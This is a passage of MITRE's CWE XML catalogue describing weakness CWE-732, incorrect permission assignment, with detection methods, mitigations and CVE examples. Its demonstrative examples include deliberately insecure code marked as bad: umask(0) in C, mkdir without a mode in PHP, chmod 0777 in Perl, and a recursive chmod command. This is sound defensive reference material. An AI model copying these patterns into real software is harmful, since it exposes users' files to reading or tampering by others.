               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="732" Name="Incorrect Permission Assignment for Critical Resource" Weakness_Abstraction="Class" Status="Draft">
         <Description>
            <Description_Summary>The software specifies permissions for a security-critical
					resource in a way that allows that resource to be read or modified by unintended
					actors.</Description_Summary>
            <Extended_Description>
               <Text>When a resource is given a permissions setting that provides access to a
						wider range of actors than required, it could lead to the exposure of
						sensitive information, or the modification of that resource by unintended
						parties. This is especially dangerous when the resource is related to
						program configuration, execution or sensitive user data.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>803</Relationship_Target_ID>
               <!--2010 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>285</Relationship_Target_ID>
               <!--Improper Authorization--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>668</Relationship_Target_ID>
               <!--Exposure of Resource to Wrong Sphere--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>753</Relationship_Target_ID>
               <!--2009 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>275</Relationship_Target_ID>
               <!--Permission Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>815</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A6 - Security Misconfiguration--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>840</Relationship_Target_ID>
               <!--Business Logic Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>857</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 12 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>859</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 14 - Platform Security (SEC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>860</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 15 - Runtime Environment (ENV)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>877</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>743</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>946</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Insecure Resource Permissions--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Maintenance_Notes>
            <Maintenance_Note>
               <Text>The relationships between privileges, permissions, and actors (e.g. users
						and groups) need further refinement within the Research view. One
						complication is that these concepts apply to two different pillars, related
						to control of resources (CWE-664) and protection mechanism failures
						(CWE-396).</Text>
            </Maintenance_Note>
         </Maintenance_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Installation</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Modes_of_Introduction>
            <Mode_of_Introduction>
               <Text>The developer may set loose permissions in order to minimize problems when
						the user first runs the program, then create documentation stating that
						permissions should be tightened. Since system administrators and users do
						not always read the documentation, this can result in insecure permissions
						being left unchanged.</Text>
            </Mode_of_Introduction>
            <Mode_of_Introduction>
               <Text>The developer might make certain assumptions about the environment in
						which the software runs - e.g., that the software is running on a
						single-user system, or the software is only accessible to trusted
						administrators. When the software is running in a different environment, the
						permissions become a problem.</Text>
            </Mode_of_Introduction>
         </Modes_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read files or
						directories</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker may be able to read sensitive information from the
							associated resource, such as credentials or configuration information
							stored in a file.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker may be able to modify critical properties of the
							associated resource to gain privileges, such as replacing a
							world-writable executable with a Trojan horse.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Other</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker may be able to destroy or corrupt critical data in the
							associated resource, such as deletion of records from a database.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated static analysis may be effective in detecting permission
							problems for system resources such as files, directories, shared memory,
							device interfaces, etc. Automated techniques may be able to detect the
							use of library functions that modify permissions, then analyze function
							calls for arguments that contain potentially insecure values.</Text>
                  <Text>However, since the software's intended security policy might allow
							loose permissions for certain operations (such as publishing a file on a
							web server), automated static analysis may produce some false positives
							- i.e., warnings that do not have any security consequences or require
							any code changes.</Text>
                  <Text>When custom permissions models are used - such as defining who can
							read messages in a particular forum in a bulletin board system - these
							can be difficult to detect using automated static analysis. It may be
							possible to define custom signatures that identify any custom functions
							that implement the permission checks and assignments.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated dynamic analysis may be effective in detecting permission
							problems for system resources such as files, directories, shared memory,
							device interfaces, etc.</Text>
                  <Text>However, since the software's intended security policy might allow
							loose permissions for certain operations (such as publishing a file on a
							web server), automated dynamic analysis may produce some false positives
							- i.e., warnings that do not have any security consequences or require
							any code changes.</Text>
                  <Text>When custom permissions models are used - such as defining who can
							read messages in a particular forum in a bulletin board system - these
							can be difficult to detect using automated dynamic analysis. It may be
							possible to define custom signatures that identify any custom functions
							that implement the permission checks and assignments.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual static analysis may be effective in detecting the use of custom
							permissions models and functions. The code could then be examined to
							identifying usage of the related functions. Then the human analyst could
							evaluate permission assignments in the context of the intended security
							model of the software.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual dynamic analysis may be effective in detecting the use of
							custom permissions models and functions. The program could then be
							executed with a focus on exercising code paths that are related to the
							custom permissions. Then the human analyst could evaluate permission
							assignments in the context of the intended security model of the
							software.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Fuzzing</Method_Name>
               <Method_Description>
                  <Text>Fuzzing is not effective in detecting this weakness.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-11.1">
               <Method_Name>Black Box</Method_Name>
               <Method_Description>
                  <Text>Use monitoring tools that examine the software's process as it
							interacts with the operating system and the network. This technique is
							useful in cases when source code is unavailable, if the software was not
							developed by you, or if you want to verify that the build phase did not
							introduce any new weaknesses. Examples include debuggers that directly
							attach to the running process; system-call tracing utilities such as
							truss (Solaris) and strace (Linux); system activity monitors such as
							FileMon, RegMon, Process Monitor, and other Sysinternals utilities
							(Windows); and sniffers and protocol analyzers that monitor network
							traffic.</Text>
                  <Text>Attach the monitor to the process and watch for library functions or
							system calls on OS resources such as files, directories, and shared
							memory. Examine the arguments to these calls to infer which permissions
							are being used.</Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text>Note that this technique is only useful for permissions issues related
							to system resources. It is not likely to detect application-level
							business rules that are related to permissions, such as if a user of a
							blog system marks a post as "private," but the blog system inadvertently
							marks it as "public."</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inter-application Flow Analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Host-based Vulnerability Scanners – Examine configuration for
									flaws, verifying that audit mechanisms work, ensure host
									configuration meets certain predefined criteria</Text>
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Host Application Interface Scanner</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                        <Text>Automated Monitored Execution</Text>
                        <Text>Forced Path Execution</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Configuration Checker</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When using a critical resource such as a configuration file, check to
							see if the resource has insecure permissions (such as being modifiable
							by any regular user) [R.732.1], and generate an error or even exit the
							software if there is a possibility that the resource could have been
							modified by an unauthorized party.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Divide the software into anonymous, normal, privileged, and
							administrative areas. Reduce the attack surface by carefully defining
							distinct user groups, privileges, and/or roles. Map these against data,
							functionality, and the related resources. Then set the permissions
							accordingly. This will allow you to maintain more fine-grained control
							over your resources. [R.732.2]</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This can be an effective strategy. However, in practice, it may be
							difficult or time consuming to define these areas when there are many
							different resources or user types, or if the applications features
							change rapidly.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Phase>Installation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>During program startup, explicitly set the default permissions or
							umask to the most restrictive setting possible. Also set the appropriate
							permissions during program installation. This will prevent you from
							inheriting insecure permissions from any user who installs or runs the
							program.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>High</Mitigation_Effectiveness>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>System Configuration</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For all configuration files, executables, and libraries, make sure
							that they are only readable and writable by the software's
							administrator.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>High</Mitigation_Effectiveness>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Documentation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Do not suggest insecure configuration changes in documentation,
							especially if those configurations can extend to resources and other
							programs that are outside the scope of the application.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Installation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Do not assume that a system administrator will manually change the
							configuration to the settings that are recommended in the software's
							manual.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-37">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>System Configuration</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Ensure that the software runs properly under the Federal Desktop Core
							Configuration (FDCC) [R.732.4] or an equivalent hardening configuration
							guide, which many organizations use to limit the attack surface and
							potential risk of deployed software.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code sets the umask of the process to 0 before
						creating a file and writing "Hello world" into the file.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>#define OUTFILE "hello.out" </Code>
                     <Code/>
                     <Code> umask(0);</Code>
                     <Code> FILE *out;</Code>
                     <Comment> /* Ignore CWE-59 (link following) for brevity */</Comment>
                     <Code> out = fopen(OUTFILE, "w");</Code>
                     <Code> if (out) {</Code>
                     <Block>
                        <Code> fprintf(out, "hello world!\n");</Code>
                        <Code> fclose(out);</Code>
                     </Block>
                     <Code> }</Code>
                  </Block>
                  <Text>After running this program on a UNIX system, running the "ls -l"
							command might return the following output:</Text>
                  <Block Block_Nature="Result">
                     <Code>-rw-rw-rw- 1 username 13 Nov 24 17:58 hello.out </Code>
                  </Block>
                  <Text>The "rw-rw-rw-" string indicates that the owner, group, and world (all
							users) can read the file and write to it.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code creates a home directory for a new user, and makes that
						user the owner of the directory. If the new directory cannot be owned by the
						user, the directory is deleted.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> function createUserDir($username){</Code>
                     <Block>
                        <Code> $path = '/home/'.$username;</Code>
                        <Code> if(!mkdir($path)){</Code>
                        <Block>
                           <Code> return false;</Code>
                        </Block>
                        <Code> }</Code>
                        <Code> if(!chown($path,$username)){</Code>
                        <Block>
                           <Code> rmdir($path);</Code>
                           <Code> return false;</Code>
                        </Block>
                        <Code> }</Code>
                        <Code> return true;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>Because the optional "mode" argument is omitted from the call to
							mkdir(), the directory is created with the default permissions 0777.
							Simply setting the new user as the owner of the directory does not
							explicitly change the permissions of the directory, leaving it with the
							default. This default allows any user to read and write to the
							directory, allowing an attack on the user's files. The code also fails
							to change the owner group of the directory, which may result in access
							by unexpected groups.</Text>
                  <Text>This code may also be vulnerable to Path Traversal (CWE-22) attacks if
							an attacker supplies a non alphanumeric username.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code snippet might be used as a monitor to
						periodically record whether a web site is alive. To ensure that the file can
						always be modified, the code uses chmod() to make the file
						world-writable.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>$fileName = "secretFile.out";</Code>
                     <Code/>
                     <Code>if (-e $fileName) {</Code>
                     <Block>
                        <Code> chmod 0777, $fileName;</Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>my $outFH;</Code>
                     <Code>if (! open($outFH, "&gt;&gt;$fileName")) {</Code>
                     <Block>
                        <Code> ExitError("Couldn't append to $fileName: $!");</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>my $dateString = FormatCurrentTime();</Code>
                     <Code>my $status = IsHostAlive("cwe.mitre.org");</Code>
                     <Code>print $outFH "$dateString cwe status: $status!\n";</Code>
                     <Code>close($outFH);</Code>
                  </Block>
                  <Text>The first time the program runs, it might create a new file that
							inherits the permissions from its environment. A file listing might look
							like:</Text>
                  <Block Block_Nature="Result">
                     <Code>-rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out </Code>
                  </Block>
                  <Text>This listing might occur when the user has a default umask of 022,
							which is a common setting. Depending on the nature of the file, the user
							might not have intended to make it readable by everyone on the
							system.</Text>
                  <Text>The next time the program runs, however - and all subsequent
							executions - the chmod will set the file's permissions so that the
							owner, group, and world (all users) can read the file and write to
							it:</Text>
                  <Block Block_Nature="Result">
                     <Code>-rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out </Code>
                  </Block>
                  <Text>Perhaps the programmer tried to do this because a different process
							uses different permissions that might prevent the file from being
							updated.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following command recursively sets world-readable permissions
						for a directory and all of its children:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Shell</Code_Example_Language>
                     <Code>chmod -R ugo+r DIRNAME</Code>
                  </Block>
                  <Text>If this command is run from a program, the person calling the program
							might not expect that all the files under the directory will be
							world-readable. If the directory is expected to contain private data,
							this could become a security problem. </Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3482</Observed_Example_Reference>
               <Observed_Example_Description>Anti-virus product sets insecure "Everyone: Full
						Control" permissions for files under the "Program Files" folder, allowing
						attackers to replace executables with Trojan
						horses.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3897</Observed_Example_Reference>
               <Observed_Example_Description>Product creates directories with 0777 permissions
						at installation, allowing users to gain privileges and access a socket used
						for authentication.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3489</Observed_Example_Reference>
               <Observed_Example_Description>Photo editor installs a service with an insecure
						security descriptor, allowing users to stop or start the service, or execute
						commands as SYSTEM.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3289</Observed_Example_Reference>
               <Observed_Example_Description>Library function copies a file to a new target and
						uses the source file's permissions for the target, which is incorrect when
						the source file is a symbolic link, which typically has 0777 permissions.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0115</Observed_Example_Reference>
               <Observed_Example_Description>Device driver uses world-writable permissions for
						a socket file, allowing attackers to inject arbitrary
						commands.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-1073</Observed_Example_Reference>
               <Observed_Example_Description>LDAP server stores a cleartext password in a
						world-readable file.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0141</Observed_Example_Reference>
               <Observed_Example_Description>Terminal emulator creates TTY devices with
						world-writable permissions, allowing an attacker to write to the terminals
						of other users.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0662</Observed_Example_Reference>
               <Observed_Example_Description>VPN product stores user credentials in a registry
						key with "Everyone: Full Control" permissions, allowing attackers to steal
						the credentials.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0322</Observed_Example_Reference>
               <Observed_Example_Description>Driver installs its device interface with
						"Everyone: Write" permissions.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3939</Observed_Example_Reference>
               <Observed_Example_Description>Driver installs a file with world-writable
						permissions.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3611</Observed_Example_Reference>
               <Observed_Example_Description>Product changes permissions to 0777 before
						deleting a backup; the permissions stay insecure for subsequent
						backups.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-6033</Observed_Example_Reference>
               <Observed_Example_Description>Product creates a share with "Everyone: Full
						Control" permissions, allowing arbitrary program
						execution.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5544</Observed_Example_Reference>
               <Observed_Example_Description>Product uses "Everyone: Full Control" permissions
						for memory-mapped files (shared memory) in inter-process communication,
						allowing attackers to tamper with a session.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-4868</Observed_Example_Reference>
               <Observed_Example_Description>Database product uses read/write permissions for
						everyone for its shared memory, allowing theft of credentials.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-1714</Observed_Example_Reference>
               <Observed_Example_Description>Security product uses "Everyone: Full Control"
						permissions for its configuration files.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0006</Observed_Example_Reference>
               <Observed_Example_Description>"Everyone: Full Control" permissions assigned to a
						mutex allows users to disable network
						connectivity.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0969</Observed_Example_Reference>
               <Observed_Example_Description>Chain: database product contains buffer overflow
						that is only reachable through a .ini configuration file - which has
						"Everyone: Full Control" permissions.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.732.1">
